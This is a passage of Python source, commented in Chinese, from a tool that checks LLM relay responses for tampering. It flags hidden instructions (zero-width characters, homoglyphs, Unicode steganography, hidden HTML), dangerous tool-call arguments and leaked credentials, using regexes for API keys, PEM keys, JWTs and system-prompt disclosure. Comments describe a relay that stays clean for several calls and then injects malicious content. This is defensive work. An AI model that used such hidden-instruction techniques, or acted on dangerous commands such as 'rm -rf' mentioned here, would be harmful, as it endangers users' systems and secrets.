                    severity="high",
                    detail=(
                        f"拉丁文本中混入 {len(suspects)} 个西里尔同形异义字（{uniq!r}），"
                        f"肉眼无法区分，可用于绕过关键词过滤"
                    ),
                    evidence="",
                )
            )

    return findings


def _check_hidden_instructions(text: str) -> List[VerificationFinding]:
    """检测隐藏指令（Unicode 隐写 + 零宽字符 + HTML 隐藏元素）。"""
    findings: List[VerificationFinding] = []

    # ★ Unicode 隐写优先级最高：它是唯一「解码后能直接给出敌人原文」的一类
    findings.extend(_check_unicode_steganography(text))

    for pattern, label in _INVISIBLE_CHARS:
        matches = re.findall(pattern, text)
        if matches:
            chars = "".join(sorted(set(matches)))
            findings.append(
                VerificationFinding(
                    category="hidden_instruction",
                    severity="high" if len(matches) >= 3 else "medium",
                    detail=f"响应包含 {len(matches)} 个{label}（{chars!r}），可能存在隐藏指令",
                    evidence=_mask_evidence(text, text.find(matches[0])),
                )
            )

    for pattern, label, sev in _HTML_HIDDEN:
        m = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
        if m:
            findings.append(
                VerificationFinding(
                    category="hidden_instruction",
                    severity=sev,
                    detail=f"响应包含{label}，人眼不可见但模型可读",
                    evidence=_mask_evidence(text, m.start(), window=80),
                )
            )

    return findings


# ══════════════════════════════════════════════════════════════
# 统计类信号名单（「误报不阻断」的唯一事实源）
# ══════════════════════════════════════════════════════════════

#: 反映内容「长得不一样」，但证明不了「被动了手脚」。
#:
#: ★ 这份名单是「误报不阻断」的唯一事实源（2026-10-03）。
#:   长度突变是**症状**不是**证据**：用户问「你好」回 3 字、
#:   问技术问题回 11000 字，在统计上完全正常 ——
#:   实测本机 41 条响应侧阻断里 36 条是长度突变。
#:   拿「偏离 124σ」当罪证，等于把用户的正常提问当成攻击；
#:   而用户此时正等着 AI 干活，被拦住只会让他失去对工具的信任。
STATISTICAL_SIGNALS: frozenset = frozenset({
    "length_anomaly",
    "structure_anomaly",
})


#: 只作记录、**永不阻断**的类别全集（2026-10-04 扩展）。
#:
#: ★ content_policy 为什么必须在这里
#: ────────────────────────────────────────────────────────────
#: 企业版护栏的「违规语义方向 / 高危违规模式」判的是
#: **模型自己说了什么**（输出里有没有敏感词），
#: 而玄盾要管的是**中转站做了什么**（有没有篡改请求/响应）。
#: 两者毫无关系：模型在讨论安全话题时必然出现「绕过/漏洞/攻击」，
#: 把这算成中转站的罪证，唯一后果是让用户弃用一个没问题的服务商 ——
#: 而那恰恰是本模块一直在避免的事（见 tracker._RELAY_ATTRIBUTABLE
#: 里对「长度突变不算中转站责任」的同类处理）。
#:
#: 实测（2026-10-04）：一段纯正常的会话总结（内容是
#: 「用户希望理解系统提示词被拦截的原因」）被判为
#: block + system_prompt_inject，前端翻译成
#: 「中转站可能在偷偷改写 AI 的行为」—— 张冠李戴，
#: 而展示的「证据」片段正是模型自己生成的正常输出。
#:
#: ★ dangerous_content 为什么也要在这里
#: ────────────────────────────────────────────────────────────
#: 它是「响应正文/代码块里出现了危险命令」——判据来源是**模型自己的输出**，
#: 而本产品的核心用户正用玄盾代理 Claude Code / Cursor。
#: 让 AI 写一段含 `rm -rf` 的脚本、贴一段用 `eval(` 的代码，
#: 都是正常诉求；把这些一律阻断，等于把产品的主战场变成雷区。
#: 真正指向「中转站在指示客户端执行」的是结构化 tool_calls
#: （类别仍为 tool_call_dangerous，仍阻断），两者必须分开。
OBSERVATION_ONLY_SIGNALS: frozenset = STATISTICAL_SIGNALS | {
    "content_policy",
    "dangerous_content",
    # ★ 2026-10-23：响应里出现「请求从未发送过的凭证」。
    #   这一类是为「留证据给用户去核实」而存在的，不是拦截理由：
    #   模型完全可能在示例代码里自己编一枚 eyJ 开头的 token。
    #   只记录、只提示，绝不因为这一条把对话打断 ——
    #   打断了用户反而拿不到证据。
    "credential_from_response",
}


#: 内容合规类的护栏 reason 特征（用于把「模型说了敏感词」
#: 与「中转站动了手脚」分开）。命中即归 content_policy。
_CONTENT_POLICY_REASON_MARKS: tuple = (
    "违规语义",
    "高危违规模式",
    "违规原型",
    "疑似违规",
)


# ══════════════════════════════════════════════════════════════
# 第 3 类：响应模式异常（长度/结构突变 3σ）
# ══════════════════════════════════════════════════════════════


class PatternTracker:
    """会话级响应模式追踪器（检测中转站的条件触发型篡改）。

    攻击特征：中转站在前 N 次调用中表现正常（建立信任），
    在第 N+1 次突然返回恶意内容。长度/结构突变是重要信号。

    ★★ 本类产出的统计类信号一律不具备阻断能力
      （v0.1.1，闸门见 ``decide_response_action``）。
    """

    #: 指向模块级 STATISTICAL_SIGNALS 这唯一事实源，不另立一份：
    #: 两份名单一旦漂移，就会出现「检测点认为不阻断、闸门却拦下」，
    #: 而两边各自的单测都还是绿的。
    _STATISTICAL = STATISTICAL_SIGNALS

    def __init__(self, window_size: int = 10, sigma_threshold: float = 3.0):
        self._window_size = window_size
        self._sigma = sigma_threshold
        self._lengths: Dict[str, List[int]] = {}     # session -> 长度历史
        self._structures: Dict[str, List[str]] = {}  # session -> 结构签名历史

    def _structure_signature(self, text: str) -> str:
        """提取文本结构签名（字符类序列的粗粒度指纹）。"""
        classes: List[str] = []
        for ch in text[:200]:
            if ch.isdigit():
                classes.append("N")
            elif ch.isalpha():
                classes.append("A")
            elif ch in " \t":
                classes.append(" ")
            elif ch in "\n\r":
                classes.append("\n")
            else:
                classes.append(".")
        # 压缩连续同类字符
        sig: List[str] = []
        for c in classes:
            if not sig or sig[-1] != c:
                sig.append(c)
        return "".join(sig)

    def check(self, session_id: str, text: str) -> List[VerificationFinding]:
        """检查本次响应是否相对历史基线突变。"""
        findings: List[VerificationFinding] = []
        length = len(text)
        signature = self._structure_signature(text)

        lengths = self._lengths.setdefault(session_id, [])
        structs = self._structures.setdefault(session_id, [])

        # 历史不足 3 次不检测
        if len(lengths) >= 3:
            mean_len = statistics.mean(lengths)
            std_len = statistics.pstdev(lengths)

            # 长度突变检测
            if std_len < 1e-6:
                # 标准差为 0：本次长度与历史完全不同即为异常
                if length > mean_len * 2 and mean_len > 0:
                    findings.append(
                        VerificationFinding(
                            category="length_anomaly",
                            # ★ 恒为 low：统计信号不得推高整体严重程度。
                            #   原实现按 |σ| 把它升到 high（实测有 124σ 的记录），
                            #   而 high 在均衡档直接等于 BLOCK ——
                            #   于是「你这次问得长」被当成「中转站攻击了你」。
                            #   长度再异常也只是「不一样」，证明不了「被篡改」。
                            severity="low",
                            detail=(
                                f"响应长度异常：本次 {length} 字符，"
                                f"历史稳定在 {int(mean_len)} 字符（超过 2 倍）"
                            ),
                            evidence="",
                        )
                    )
            else:
                sigma = (length - mean_len) / std_len
                if abs(sigma) > self._sigma:
                    direction = "突然变长" if sigma > 0 else "突然变短"
                    findings.append(
                        VerificationFinding(
                            category="length_anomaly",
                            # ★ 同上：恒为 low，不因|σ| 升高而具备阻断能力
                            severity="low",
                            detail=(
                                f"响应长度{direction}：本次 {length} 字符，"
                                f"偏离历史均值 {mean_len:.0f} 达 {sigma:.1f}σ"
                            ),
                            evidence="",
                        )
                    )

            # 结构突变检测
            if len(structs) >= 3:
                recent = structs[-5:]
                common = max(set(recent), key=recent.count)
                # 本次结构与近期主流结构差异过大
                if common and _structure_distance(signature, common) > 0.6:
                    findings.append(
                        VerificationFinding(
                            category="structure_anomaly",
                            # ★ 同为统计信号：字符类分布变化只说明
                            #   「这次内容类型和以前不同」—— 让模型写代码
                            #   就会从散文变成代码，分布必然变。
                            #   证明不了中转站篡改了什么，故恒为 low。
                            severity="low",
                            detail="响应结构与历史显著不同（字符类分布突变），仅作记录，不阻断",
                            evidence=signature[:60],
                        )
                    )

        # 记录本次（限制窗口）
        lengths.append(length)
        if len(lengths) > self._window_size:
            lengths.pop(0)
        structs.append(signature)
        if len(structs) > self._window_size:
            structs.pop(0)

        return findings

    def clear(self, session_id: str) -> None:
        """清除会话基线。"""
        self._lengths.pop(session_id, None)
        self._structures.pop(session_id, None)


def _structure_distance(a: str, b: str) -> float:
    """结构签名距离（0=相同，1=完全不同）。

    用归一化编辑距离的补数作为距离。
    """
    if not a or not b:
        return 1.0
    # 快速长度差异判断
    len_diff = abs(len(a) - len(b)) / max(len(a), len(b))
    if len_diff > 0.8:
        return 1.0
    # 简化的公共子序列比例
    common = 0
    i = j = 0
    while i < len(a) and j < len(b):
        if a[i] == b[j]:
            common += 1
            i += 1
            j += 1
        elif a[i] < b[j]:
            i += 1
        else:
            j += 1
    similarity = common / max(len(a), len(b))
    return 1.0 - similarity


# ══════════════════════════════════════════════════════════════
# 响应侧处置决策
# ══════════════════════════════════════════════════════════════


def _demote_undeclared_without_danger(findings: List[VerificationFinding]) -> None:
    """「未声明的工具名」在没有危险动作伴随时只记录，不阻断。

    ★★ 2026-10-28 实测（日志 #7336 / #7374）：
      客户端把「跑命令」拆成了好几个工具名（Shell / RunCommand /
      CheckCommandStatus / ReadCommandOutput…），而请求里声明的只有其中
      一部分。模型返回另一个阶段的工具名时，旧判据按 high 直接阻断，
      一早上打断了两次正常对话。

      这两条为什么不能算「凭空造调用」：
        · 客户端的工具名映射是**客户端自己**定的，中转站造一个它不认识
          的名字，客户端根本不会执行（拿不到 handler）—— 没有可执行面；
        · 真正的伤害必须落在「参数里有危险动作」上，而那是
          tool_call_dangerous 的判据，不是这一条。

      所以口径改为：
        · 未声明 + 本轮**没有**高危工具参数 → medium（记录、可解释）；
        · 未声明 + 本轮**有**高危工具参数  → 保持 high（一并阻断）。
      名字族已在 baseline._TOOL_FAMILIES 里显式枚举，别名不会走到这里。
    """
    if not findings:
        return
    has_danger = any(
        f.category == "tool_call_dangerous" and f.severity == "high"
        for f in findings
    )
    if has_danger:
        return
    for f in findings:
        if f.category == "undeclared_tool" and f.severity == "high":
            f.severity = "medium"
            f.detail += (
                "（本轮参数中没有出现危险动作，客户端也不会执行自己不认识的工具名；"
                "仅作记录，不阻断）"
            )


def decide_response_action(
    level: str, findings: List[Any]
) -> Tuple[str, str]:
    """把本轮全部 findings 汇总成 (处置动作, 最高严重程度)。

    ★★ 这是响应侧唯一的决策闸门（v0.1.1）
    ────────────────────────────────────────────────────────────
    规则一：整体严重程度取所有 findings 的最大值
    规则二：**只有统计类信号时，永不阻断**
    规则三：**只有内容合规类信号时，永不阻断**（2026-10-04 新增）

    规则二/三为什么放在这里而不是各检测点：
      · 放在各检测点（把 severity 固定为 low）不够 ——
        整体严重程度取的是最大值，将来任何人给统计类标 high，
        阻断就会复活，而所有单点测试照样绿。
      · 必须是独立于 severity 取值的一道判断，才拦得住这种回归。

    规则二为什么是「只有」而不是「含有统计类就放过」：
      攻击者只要同时制造一次长度突变就能绕过 —— 那是可利用的漏洞。

    这段刻意做成模块级纯函数：测试可以直接调它验证闸门，
    而不必复制一份逻辑（复制 = 测试永远绿 = 假护栏）。
    """
    if not findings:
        return Action.PASS.value, "low"

    order = {"low": 0, "medium": 1, "high": 2}
    max_sev = max(
        (getattr(f, "severity", "low") for f in findings),
        key=lambda s: order.get(s, 0),
    )
    action = _threshold_for_level(level, max_sev)

    categories = {getattr(f, "category", "") for f in findings}
    if action == Action.BLOCK.value and categories <= OBSERVATION_ONLY_SIGNALS:
        logger.info(
            "仅有观测类信号（%s），不阻断：%s",
            "/".join(sorted(categories)),
            getattr(findings[0], "detail", ""),
        )
        action = Action.ALERT.value

    return action, max_sev


def _threshold_for_level(level: str, severity: str) -> str:
    """某严重程度在给定安全级别下的处置。"""
    if severity == "high":
        return {
            "lenient": Action.ALERT.value,
            "balanced": Action.BLOCK.value,
            "strict": Action.BLOCK.value,
        }.get(level, Action.BLOCK.value)
    if severity == "medium":
        return {
            "lenient": Action.PASS.value,
            "balanced": Action.ALERT.value,
            "strict": Action.BLOCK.value,
        }.get(level, Action.ALERT.value)
    return Action.PASS.value


# ══════════════════════════════════════════════════════════════
# 验证器主类
# ══════════════════════════════════════════════════════════════


class ResponseVerifier:
    """响应侧完整性验证器。

    复用企业版输出护栏（提示词注入 + 敏感泄露），
    新增中转站特有检测（tool call 危险参数 / 隐藏指令 / 模式突变）。
    """

    def __init__(
        self,
        level: str = SecurityLevel.BALANCED.value,
        enable_pattern_check: bool = True,
    ) -> None:
        self._level = level
        self._enable_pattern_check = enable_pattern_check
        self._tracker = PatternTracker()

        # ── 复用企业版输出护栏（延迟导入，避免循环依赖）──
        self._output_guardrail = None
        self._guardrail_available = False
        self._try_load_guardrail()

    def _try_load_guardrail(self) -> None:
        """加载输出护栏（只取需要的那一个组件）。

        ★★ P1-8（2026-10-28）：不要为了拿 output_guardrail 而实例化整个
          企业版 ``XuanDun``。
          那会连带建出 reject_gate / DynamicShell / 两个 mapper /
          timing_checker / 各 checker —— 个人版一个都用不上，
          却要为它们付启动时间与常驻内存；更糟的是「跑着一整套企业版
          检测管道」这件事本身与个人版的产品边界不符：
          个人版只做**出站脱敏 + 响应验真**，不做内容审查。

          现在直接构造 ``OutputGuardrail(config)`` —— 它本来就是
          独立组件（内部自带洛书编码器，不共享输入侧原型库）。
        """
        try:
            from daoti_xuandun._check_output import OutputGuardrail
            from daoti_xuandun.config import DefenseLevel, XuanDunConfig

            # ★★ 构建期密钥必须在 preset **之前**进入：XuanDunConfig 的
            #   __post_init__ 会在这里把 shell_key / mapping_key 定下来。
            #   之后再赋值虽然也能生效，但那条「正在使用不安全 fallback」的
            #   告警已经写进 stderr —— 发布包里它就是假消息。
            with _build_secrets_env() as secrets_applied:
                config = XuanDunConfig.preset(DefenseLevel.STANDARD)
            config.enable_output_guardrail = True
            if not secrets_applied:
                logger.info("护栏使用源码内 fallback 密钥（开发态正常；发布包应已注入）")
            self._output_guardrail = OutputGuardrail(config)
            self._guardrail_available = self._output_guardrail is not None
            logger.info("输出护栏加载成功（提示词注入 + 敏感泄露检测）")
        except Exception as e:  # noqa: BLE001 — 复用失败不应阻断个人版
            self._output_guardrail = None
            self._guardrail_available = False
            logger.warning("输出护栏加载失败，仅启用个人版自研检测: %s", e)

    def set_level(self, level: str) -> None:
        if level not in (s.value for s in SecurityLevel):
            raise ValueError(f"无效的安全级别: {level}")
        self._level = level

    def set_pattern_check(self, enabled: bool) -> None:
        """开关响应模式异常检测（★ P2-15：让配置项真正生效）。"""
        self._enable_pattern_check = bool(enabled)
        logger.info("响应模式异常检测已%s", "开启" if enabled else "关闭")

    def _threshold_for(self, severity: str) -> str:
        """返回某严重程度在当前安全级别下的整体处置。

        ★ 委托给模块级 ``_threshold_for_level`` ——
          两处各写一份映射表，必然漂移；而漂移的后果是
          「verify() 判block、外层日志判 alert」，界面与日志对不上。
        """
        return _threshold_for_level(self._level, severity)

    def verify(
        self,
        content: str,
        session_id: str = "default",
        payload: Any = None,
        baseline: Any = None,
    ) -> VerifyResult:
        """验证响应内容。

        Args:
            content: 响应文本（纯文本内容部分）
            session_id: 会话标识（用于模式基线）
            payload: 完整响应结构（用于 tool call 检测），可为 str/dict
            baseline: RequestBaseline（请求侧可信对照物）。传入后
                额外执行结构差分检测 —— 这是唯一能防住
                「载荷不含任何被禁词」那类攻击的判据来源。

        Returns:
            VerifyResult：含整体处置、最高严重程度、发现项列表
        """
        findings: List[VerificationFinding] = []

        # ① Tool Call 危险参数
        if payload is not None:
            findings.extend(_check_tool_calls(payload, content))
        else:
            findings.extend(_check_tool_calls(None, content))

        # ② 系统提示词注入 + ⑤ 敏感泄露（复用企业版输出护栏）
        if self._guardrail_available and self._output_guardrail is not None:
            findings.extend(self._check_with_guardrail(content, session_id))

        # ③ 响应模式异常
        if self._enable_pattern_check:
            findings.extend(self._tracker.check(session_id, content))

        # ④ 隐藏指令
        findings.extend(_check_hidden_instructions(content))

        # ⑥ ★ v0.1.0 结构差分（请求 ↔ 响应）
        #   前五类判据都是「响应文本自身长得像不像攻击」，
        #   而中转站的演化方向是不含任何被禁词 —— 实测 9/13 绕过。
        #   这一类的判据来源是请求本身，不依赖被评判的模型，
        #   因此不存在循环论证。
        baseline_findings = self._check_against_baseline(content, payload, baseline)
        # ★ 2026-10-28：「未声明工具名」只有与高危工具参数同时出现才阻断，
        #   见 _demote_undeclared_without_danger。必须在汇总前降级，
        #   否则 decide_response_action 取到的最大值仍是 high。
        #   传入的是**合并视图**：高危工具参数由 ① 产生，不在 baseline 列表里。
        _demote_undeclared_without_danger(findings + baseline_findings)
        findings.extend(baseline_findings)

        if not findings:
            return VerifyResult(action=Action.PASS.value, severity="low")

        action, max_sev = decide_response_action(self._level, findings)

        return VerifyResult(
            action=action,
            severity=max_sev,
            findings=findings,
            blocked_reason=(
                findings[0].detail if action == Action.BLOCK.value else None
            ),
        )

    def _check_with_guardrail(
        self, content: str, session_id: str
    ) -> List[VerificationFinding]:
        """调用企业版输出护栏做检测。"""
        findings: List[VerificationFinding] = []
        try:
            decision = self._output_guardrail.check_output(
                content, session_state={}, session_id=session_id
            )
        except Exception as e:  # noqa: BLE001 — 复用层异常降级
            logger.warning("输出护栏调用异常，跳过该项检测: %s", e)
            return findings

        risk = getattr(decision, "risk_level", "low")
        reason = getattr(decision, "reason", "") or ""
        action = getattr(decision, "action", "")

        # ★ P0-4 修复：原实现用 `"敏感" in reason` 关键词判定分类，
        #   但企业版 8 个 reason 取值中仅 2 个含「敏感」，且这 2 个属 redact
        #   （打码）分支，与本处进入条件 risk in (high, medium) 几乎不重合
        #   → 导致 sensitive_leak 在整个代码库永远不会被产生。
        #   改用「结构化判定 + 本地正则兜底」双通道，不依赖 reason 文案。
        #
        # ★★ 2026-10-04：判定顺序改为「护栏 reason 优先」，
        #   并把「判不出来」从「归类为 system_prompt_inject」改成
        #   「不产生 finding」。详见 _classify_guardrail_hit。
        category = self._classify_guardrail_hit(content, risk, action, reason)

        if category is None:
            return findings

        if category == "content_policy":
            # ★★ P1-8（2026-10-28）：个人版**不记**内容合规类命中。
            #
            #   这一类判的是「模型自己说了敏感词 / 违规语义」，与
            #   「中转站有没有篡改返回」毫无关系 —— 而个人版的产品承诺
            #   是出站脱敏 + 响应验真，不是内容审查。
            #
            #   原实现给它标 medium 并落成一条「提示」：用户看到的是
            #   「玄盾提示了你 39 次」，点进去全是自己的技术总结
            #   （实测稳定版 39 条误报全出在这里），既不可解释，
            #   又把真正重要的伤害信号淹没。边界归位后这里直接返回。
            return findings

        severity = "high" if risk == "high" else "medium"
        # ★ 2026-10-22：不再往界面抛「[企业版护栏]」这种内部产品名。
        #   它是我们自己的实现细节，用户看到只会疑惑「我买的是个人版，
        #   怎么冒出企业版的东西」。换成中性的「内容检查」。
        detail = (
            f"内容检查：{reason}" if reason
            else "内容检查命中风险内容"
        )

        if category == "sensitive_leak":
            # ★★ 2026-10-28（日志 #8470 复核）：这一类**维持 high / 阻断**。
            #
            #   判据是「回答正文里出现了真实凭证形态」（sk- / AKIA / PEM / JWT，
            #   见 _SENSITIVE_LEAK_RE，带左边界，普通英文复合词不会命中）。
            #   与 content_policy 的区别正在这里：那是模型说敏感词，
            #   这是模型把**凭证本体**吐了出来 —— 无论来源是你的还是它的，
            #   都该立刻让你知道，而不是静默放过。
            #
            #   复核过程：当天同一 reason（「输出内容命中高危违规模式」）
            #   的 #7530 被判成 content_policy（只记录），#8470 却是
            #   sensitive_leak —— 唯一差异只能是正文里命中了凭证正则。
            #   因此这一条不是误报，是判据本身在起作用。
            #
            #   但原本文案是「内容检查：输出内容命中高危违规模式，已拦截」——
            #   用户看不出「哪里出了问题」。这里换成人话，并给出处置建议。
            detail = (
                "回答正文里出现了密钥/令牌形态的字样（已打码显示）。"
                "这可能是模型复述了你贴过的凭证，也可能是它自己编的示例；"
                "请核对是否真实 —— 若真实，请立即更换该凭证。"
            )

        findings.append(
            VerificationFinding(
                category=category,
                severity=severity,
                detail=detail,
                evidence=_mask_evidence(content, 0, window=50),
            )
        )

        return findings

    # 护栏 reason 里指向「提示词/指令泄露」的特征。
    #
    # ★★ 2026-10-04（误报修复）：这里**不再**用内容正则去猜提示词注入。
    #   此前有个 `_PROMPT_INJECT_RE`，只要 content 里出现「系统提示词 /
    #   系统指令 / internal instructions」几个字就归类为
    #   system_prompt_inject（high）→ 阻断，前端再翻译成
    #   「中转站可能在偷偷改写 AI 的行为」。
    #
    #   但「回答里提到这几个字」是极其常见的正常内容：
    #   用户在问 prompt 工程、在讨论刚才那条拦截、在读一份安全文档……
    #   把它当成「中转站篡改」是纯粹的张冠李戴，且会直接阻断。
    #
    #   判据改为：只看**护栏自己给出的 reason**。护栏是提示词注入的实际
    #   检测器，它若真判了注入，reason 里必然出现「提示词 / 指令 / 注入 /
    #   泄露方向」等词；它没说，我们就不替它下结论。
    _PROMPT_INJECT_REASON_MARKS = (
        "提示词", "系统指令", "内部指令", "注入",
        "泄露方向", "prompt", "instruction",
    )
    # 敏感信息外泄特征（密钥/凭证形态出现在输出中）
    # ★ v0.1.0 修复：字符类原为 [A-Za-z0-9]，不含 '-'，
    #   匹配不到 sk-proj- / sk-svcacct- 这类带第二段前缀的现代密钥
    #   （实测泄漏样本被判成 system_prompt_inject，分类错误）。
    #   sanitizer.py 的同类规则早已含 '\-'，两侧此前不一致。
    #
    # ★★ 2026-10-04（误报修复，用户实测 id=2059）：前缀必须带**左边界**。
    #   无边界时 `sk-` 会匹配到普通英文复合词中间，例如
    #     risk-assessment-framework / task-orchestration-pipeline /
    #     disk-usage-report-...  —— 「…sk-」后面凑满 20 个
    #     [A-Za-z0-9\-_] 就命中，于是把一段完全正常的回答判成
    #   「回答里出现了敏感信息」并**拦截**（实测那条正是这么来的）。
    #   真实密钥左侧永远是分隔符（行首/空格/引号/=/:/`Bearer `），
    #   加 (?<![A-Za-z0-9_]) 即可精确区分，且不影响任何真实密钥。
    #   AKIA 同理。
    _SENSITIVE_LEAK_RE = re.compile(
        r"(?:(?<![A-Za-z0-9_])sk-[A-Za-z0-9\-_]{20,}|"
        r"(?<![A-Za-z0-9])AKIA[0-9A-Z]{16}|"
        r"-----BEGIN\s+\w*\s*PRIVATE KEY-----|"
        r"eyJ[A-Za-z0-9\-_]{8,}\.eyJ)",
    )

    # ★★ 2026-10-27：真正的「提示词泄露陈述」长什么样。
    #
    #   实测误报：模型回答里写「按你的规则，复杂问题需要六键辅助分析」，
    #   护栏 reason 里带了「泄露方向」，于是被判成 system_prompt_inject
    #   并**阻断**。可那句话只是在复述用户的约束，没有任何系统提示词被吐出。
    #
    #   现在要求正文里出现「泄露陈述」本身才归类 —— 口径从
    #   「提到了相关词」收紧到「说出了被泄露的内容」。
    _PROMPT_DISCLOSURE_RE = re.compile(
        r"(?:系统提示词|系统指令|内部指令|预置指令|初始指令)"
        r"|(?:my|the)\s+(?:system\s+)?(?:prompt|instructions?)\b"
        r"|(?:我|本模型)(?:被|收到的)?(?:要求|指示|指令|设定)(?:是|为|如下)"
        r"|you\s+are\s+(?:an?\s+)?(?:AI|assistant)\s+(?:programmed|instructed|told)",
        re.IGNORECASE,
    )

    @classmethod
    def _classify_guardrail_hit(
        cls, content: str, risk: str, action: str, reason: str
    ) -> Optional[str]:
        """判定企业版护栏命中的类别。

        返回 'content_policy' / 'system_prompt_inject' / 'sensitive_leak' / None。

        ★★ 判定顺序在 2026-10-04 做了根本性调整
        ────────────────────────────────────────────────────────────
        原顺序是「先扫 content 正则，最后用 risk==high 兜底归为
        system_prompt_inject」。两个后果，实测都能复现：

          ① 兜底等于「判不出来就当中转站篡改」。
             护栏说「违规语义方向」（模型说了敏感词），
             落到兜底变成 system_prompt_inject（中转站改了内容），
             前端接着翻译成「中转站可能在偷偷改写 AI 的行为」。
             模型说了什么 ≠ 中转站做了什么，这两件事被焊在了一起。

          ② 先扫 content 让「模型正常提到『系统提示词』这个词」
             直接命中 _PROMPT_INJECT_RE —— 于是护栏判的
             「违规语义」被 content 里的无关词改写成「提示词注入」。

        ★★ 2026-10-04（误报修复）：③ 也改成**只看 reason**。
          上一版把「内容里出现系统提示词字样」当作提示词注入的判据，
          但那是极常见的正常内容（用户在问 prompt 工程、在讨论这条拦截、
          在读安全文档），据此判 high + block 是纯粹的张冠李戴。
          护栏才是提示词注入的实际检测器：它真判了，reason 里必然带
          「提示词 / 指令 / 注入 / 泄露方向」等词；它没说，就不替它下结论。

        新顺序把**护栏自己的 reason 当权威**：它说这是内容合规，
        就归 content_policy，不再让 content 词表去覆盖它。

        ★ 为什么不再有 risk==high 兜底：
          兜底会把「未知类别」当成「最严重的已知类别」。
          未知就是未知 —— 返回 None（不产生 finding）比
          编造一个罪名诚实，也避免用户按错误结论去换中转站。
        """
        reason_text = reason or ""

        # ① 真实凭证形态 → sensitive_leak。
        #    ★ 必须排在 reason 之前：护栏对含密钥的文本也可能报
        #      「高危违规模式」，若让 reason 优先，真实密钥泄露会被
        #      降级成「内容合规」而不再阻断 —— 那是把误报修成了漏报。
        #      实测：`sk-proj-...` 文本曾因此从 block 掉到 alert。
        if cls._SENSITIVE_LEAK_RE.search(content):
            return "sensitive_leak"

        # ② 护栏明确判的是「内容合规」→ 与中转站无关。
        #    放在提示词判据之前：模型在正常对话里提到
        #    「系统提示词」这几个字，不该被解读成中转站篡改。
        if any(k in reason_text for k in _CONTENT_POLICY_REASON_MARKS):
            return "content_policy"

        # ③ 护栏 reason 指向提示词/指令泄露 → system_prompt_inject。
        #    ★ 2026-10-04（误报修复）：判据只看 reason，不再扫 content。
        #    ★ 2026-10-27：但 reason 只说「方向」，正文里必须有泄露陈述。
        #      「按你的规则……」这类复述不算泄露，降为 content_policy。
        if any(k in reason_text for k in cls._PROMPT_INJECT_REASON_MARKS):
            if cls._PROMPT_DISCLOSURE_RE.search(content):
                return "system_prompt_inject"
            return "content_policy"

        # ④ 护栏只是要求「打码」→ 归内容合规（仅记录），不指控中转站。
        #
        #    ★★ 2026-10-22（个人版降噪）：
        #      这一步原来返回 sensitive_leak，于是「输出内容命中敏感模式，
        #      已打码」会在个人版里显示成中危告警「回答里出现了敏感信息」。
        #      实测案例：用户让 AI 整理一份技术总结，正文提到环境变量名与
        #      示例密钥形态，护栏判了 redact —— 内容里并没有任何真实密钥。
        #      企业版护栏偏通用合规（它服务的是"防止机密外发"），
        #      而个人版的定位是出站脱敏 + 响应验真，不是内容审查。
        #      真正的凭证形态由上面 ① 的本地正则先行捕获，
        #      所以这里降级不会漏掉真实泄露，只是不再把"像"当成"是"。
        if action == "redact":
            return "content_policy"

        # ⑤ reason 关键词（多语言）兜底，但**不做 risk==high 的无差别归类**。
        #    ★ 2026-10-04：系统类改为精确特征集，不再用裸「系统」——
        #      否则 reason 里出现「系统错误」这类字样也会被判成提示词注入。
        #    ★ 2026-10-22：与 ④ 同理，降为 content_policy。
        if any(k in reason_text for k in ("敏感", "打码", "sensitive", "redact")):
            return "content_policy"
        if any(k in reason_text for k in cls._PROMPT_INJECT_REASON_MARKS):
            # ★ 同 ③：没有泄露陈述就只是「提到了相关词」，不指控中转站。
            if cls._PROMPT_DISCLOSURE_RE.search(content):
                return "system_prompt_inject"
            return "content_policy"
        return None

    def _check_against_baseline(
        self, content: str, payload: Any, baseline: Any
    ) -> List[VerificationFinding]:
        """结构差分检测：响应是否偏离了请求本身声明的内容。

        ★ 这是 v0.1.0 最重要的新增。前五类检测的判据都是
          「响应文本自身长得像不像攻击」，判据来源是被检测对象本身；
          这里的判据来源是**请求** —— 一个中转站无法伪造的可信对照物。

        无 baseline 时静默跳过（不产生误报），保证旧调用路径不受影响。
        """
        if baseline is None:
            return []

        try:
            from .baseline import diff_against_baseline, extract_response_facts

            facts = extract_response_facts(payload, content)
            raw = diff_against_baseline(baseline, facts, content)
        except Exception as e:  # noqa: BLE001 — 差分失败不应阻断主流程
            logger.warning("结构差分异常，跳过该项检测: %s", e)
            return []

        return [
            VerificationFinding(
                category=item["category"],
                severity=item["severity"],
                detail=item["detail"],
                evidence=item.get("evidence", ""),
            )
            for item in raw
        ]

    def clear_session(self, session_id: str) -> None:
        """清除会话基线（设置页「重置学习数据」用）。"""
        self._tracker.clear(session_id)

    def get_stats(self) -> Dict[str, Any]:
        """返回验证器状态（诊断用）。

        ★ 规则来源与护栏可用性必须对外可见：
          两者都是「静默降级」——规则文件缺失会回退到内置最小集、
          企业版护栏缺失会让提示词注入与敏感泄露两类检测完全失效。
          若这些只在日志里出现，用户看到的仍是「防护中」，
          却在用一个能力大幅缩减的版本。这是比误报更危险的状态。
        """
        rule_counts = _RULES.stats()
        return {
            "level": self._level,
            "guardrail_available": self._guardrail_available,
            # 护栏缺失时明确给出「失效了哪两层」，而非一个布尔
            "guardrail_missing_layers": (
                [] if self._guardrail_available
                else ["system_prompt_inject", "sensitive_leak"]
            ),
            "pattern_check_enabled": self._enable_pattern_check,
            "tracked_sessions": len(self._tracker._lengths),
            "rules_source": "file" if _RULES.from_file else "builtin_fallback",
            "rules_version": _RULES.version,
            "rules_count": sum(rule_counts.values()),
            "degraded": (not _RULES.from_file) or (not self._guardrail_available),
        }
